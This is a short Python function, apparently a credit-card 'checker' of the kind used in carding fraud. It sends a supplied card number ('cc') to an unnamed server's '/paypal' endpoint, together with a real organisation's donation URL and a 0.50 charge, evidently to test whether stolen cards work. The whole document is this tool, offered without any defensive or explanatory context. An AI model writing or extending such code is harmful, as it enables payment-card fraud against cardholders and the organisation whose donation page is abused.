import requests

def chkk(ccx):
    cc = ccx.strip()
    url1 = "https://act.dsausa.org"
    price = "0.50"
    res = requests.get(f"http://<server>:5500/paypal?cc={cc}&url={url1}&price={price}").text
    return res
